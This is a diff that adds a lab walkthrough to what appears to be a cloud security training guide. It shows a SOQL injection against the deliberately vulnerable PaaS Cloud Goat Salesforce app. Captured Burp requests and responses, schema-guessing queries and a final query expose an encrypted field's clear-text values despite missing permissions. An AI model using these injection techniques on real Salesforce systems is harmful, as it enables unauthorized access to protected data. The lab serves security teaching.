@@ -240,3 +240,125 @@ In this case the API software bug was that it assumed only the short-form which 
 </details>
 
 ---
+
+<details>
+<summary>Encrypted Field Data Access Bypass - SOQL Injection</summary>
+
+### Prerequisites
+
+- Install Setup
+  - https://github.com/Coalfire-Research/paas-cloud-goat
+- You should be logged in using the standard user profile role
+- Your web browser should already be connected to your HTTP MitM proxy (Burp)
+- The PaaS Cloud Goat has helpful documentation on the lab exercise pages as well
+
+### Baseline Start (QA)
+
+In the PaaS Cloud Goat "welcome" tab navigate to the "Encrypted Field" page
+
+1. The cloud vendor manages the encryption and keys for the encrypted field feature
+1. You will observe that the masked values of the encrypted fields correspond to the exact length of the clear-text data
+   1. Think of the feature more as an ACL restriction
+   1. By default even your Salesforce org administrator does not get access to encrypted fields
+   1. There is a checkbox in the Salesforce configuration for granting access to view the data
+      - However, this exercise will demo how to bypass the control without a customer misconfiguration
+1. Observe on this screen that a Salesforce API change corrected a common developer mistake
+   1. The API used to have a clear-text viewing method that was commonly misused and exposed the data
+   2. Now the data appears masked regardless
+
+### Malicious Input Injection
+
+Navigate to the page "SOQL Injection - Variant 3" which will simulate a SOQL vulnerability in the application. Execute the default query and observe the request + response in your HTTP MitM proxy (Burp).
+
+```http
+POST /apex/SOQLInjection3?isdtp=p1&sfdcIFrameOrigin=https://na-personal-dev-ed.develop.lightning.force.com HTTP/2
+Host: na-personal-dev-ed--c.develop.vf.force.com
+Cookie: ...REDACTED...
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: ...REDACTED...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 8103
+Origin: https://na-personal-dev-ed--c.develop.vf.force.com
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: iframe
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=4
+Te: trailers
+
+...REDACTED...
+j_id0%3Aj_id35%3Aj_id36%3Aj_id37%3Aj_id39=j_id0%3Aj_id35%3Aj_id36%3Aj_id37%3Aj_id39&j_id0%3Aj_id35%3Aj_id36%3Aj_id37%3Aj_id39%3Aj_id43=SELECT+id%2Cownerid%2Cisdeleted%2Cname%2Ccreateddate%2Ccreatedbyid%2Clastmodifieddate%2Clastmodifiedbyid%2Csystemmodstamp%2Clastvieweddate%2Clastreferenceddate%2Centrypin__c+FROM+Building__c&j_id0%3Aj_id35%3Aj_id36%3Aj_id37%3Aj_id39%3Aj_id45=Submit&com.salesforce.visualforce.ViewState=...REDACTED...000&com.salesforce.visualforce.ViewStateMAC=AG...REDACTED...%3D&com.salesforce.visualforce.ViewStateCSRF=VmpFPSxNakF5TlMwd09TMHhObFF4TlRvd01qb3dOQzR4TkRaYSxiRmw2U0pWVkFYMXlmZFNLYW5GQ1liSk9jWVZaVXZmOTZ5WVpIYnBNWC1JPSxNVFppTUdNeA%3D%3D
+...REDACTED...
+```
+
+```http
+HTTP/2 200 OK
+Date: Sat, 13 Sep 2025 15:02:22 GMT
+Content-Type: text/html;charset=UTF-8
+...REDACTED...
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html lang="en-US"><head><script src="/static/111213/js/perf/stub.js" type="text/javascript"></script><script type="text/javascript">window.Sfdc = window.Sfdc || {};
+...REDACTED...
+        <h2>Resulting Output</h2>
+
+        <p>
+            <pre>[Building__c (Id:a00aj000010xZfbAAE, OwnerId:005aj00000Jbl1pAAB, IsDeleted:false, Name:Vault, CreatedDate:Fri Jul 25 17:46:21 GMT 2025, CreatedById:005aj00000Jbl1pAAB, LastModifiedDate:Fri Jul 25 17:46:21 GMT 2025, LastModifiedById:005aj00000Jbl1pAAB, SystemModstamp:Fri Jul 25 17:46:21 GMT 2025, EntryPIN__c:42)]
+[Building__c (Id:a00aj000010xZfcAAE, OwnerId:005aj00000Jbl1pAAB, IsDeleted:false, Name:Satellite, CreatedDate:Fri Jul 25 17:46:21 GMT 2025, CreatedById:005aj00000Jbl1pAAB, LastModifiedDate:Fri Jul 25 17:46:21 GMT 2025, LastModifiedById:005aj00000Jbl1pAAB, SystemModstamp:Fri Jul 25 17:46:21 GMT 2025, EntryPIN__c:71478)]
+[Building__c (Id:a00aj000010xZfdAAE, OwnerId:005aj00000Jbl1pAAB, IsDeleted:false, Name:HQ, CreatedDate:Fri Jul 25 17:46:21 GMT 2025, CreatedById:005aj00000Jbl1pAAB, LastModifiedDate:Fri Jul 25 17:46:21 GMT 2025, LastModifiedById:005aj00000Jbl1pAAB, SystemModstamp:Fri Jul 25 17:46:21 GMT 2025, EntryPIN__c:123123)]
+[Building__c (Id:a00aj000010xZfeAAE, OwnerId:005aj00000Jbl1pAAB, IsDeleted:false, Name:Bunker, CreatedDate:Fri Jul 25 17:46:21 GMT 2025, CreatedById:005aj00000Jbl1pAAB, LastModifiedDate:Fri Jul 25 17:46:21 GMT 2025, LastModifiedById:005aj00000Jbl1pAAB, SystemModstamp:Fri Jul 25 17:46:21 GMT 2025, EntryPIN__c:71927)]</pre>
+        </p></div><div class="pbFooter secondaryPalette"><div class="bg"></div></div></div></div><script type="text/javascript">Sfdc.onReady(function(){
+	SfdcApp && SfdcApp.Visualforce && SfdcApp.Visualforce.VSManager && SfdcApp.Visualforce.VSManager.vfPrepareForms(["j_id0:j_id35:j_id36:j_id37:j_id39"]);
+...REDACTED...
+```
+
+The part of the request that you are interested in is the `&j_id0%3Aj_id35%3Aj_id36%3Aj_id37%3Aj_id39%3Aj_id43`. The input parameter name and path were assembled by the service framework for the developer. If you look at the Apex API controller itself it uses more friendly names such as `query`. If you know the Apex controller APIs parameter names you could use those as well:
+
+```http
+query=SELECT+id%2Cownerid%2Cisdeleted%2Cname%2Ccreateddate%2Ccreatedbyid%2Clastmodifieddate%2Clastmodifiedbyid%2Csystemmodstamp%2Clastvieweddate%2Clastreferenceddate%2Centrypin__c+FROM+Building__c&querySOQL=Submit
+```
+
+Note that you must keep the session identifiers such as:
+- com.salesforce.visualforce.ViewState
+- com.salesforce.visualforce.ViewStateVersion
+- com.salesforce.visualforce.ViewStateMAC
+- com.salesforce.visualforce.ViewStateCSRF
+
+##### Goal
+
+The end goal is to retrieve the clear-text values of the encrypted fields.
+
+##### Attack Methodologies
+
+Modify the injectable SOQL query for the API /apex/SOQLInjection3.
+
+We are interested in obtaining the encrypted field `Ingredient` from the `Secret Sauce` object. Since these are custom objects in Salesforce they will require appending `__c` to get their data schema names.
+
+Take our original, unencoded query that retrieved information about buildings:
+```sql
+SELECT id,ownerid,isdeleted,name,createddate,createdbyid,lastmodifieddate,lastmodifiedbyid,systemmodstamp,lastvieweddate,lastreferenceddate,entrypin__c FROM Building__c
+```
+
+To validate if we've guessed or used the correct object schema name we use well known global attributes:
+
+```sql
+SELECT id FROM SecretSauce__c
+```
+
+Re-encode the query and submit it to the service. If you get the results you know you have a valid query. Otherwise you may get an error page or an empty page.
+
+##### Solution
+
+Continuing with guessing the target schema attribute names we arrive at:
+
+```sql
+SELECT id,name,SecretIngredient__c FROM SecretSauce__c
+```
+
+We observe that even though the user did not have permission to the encrypted field the injection vulnerability allowed us to access the clear-text data.
+
+</details>
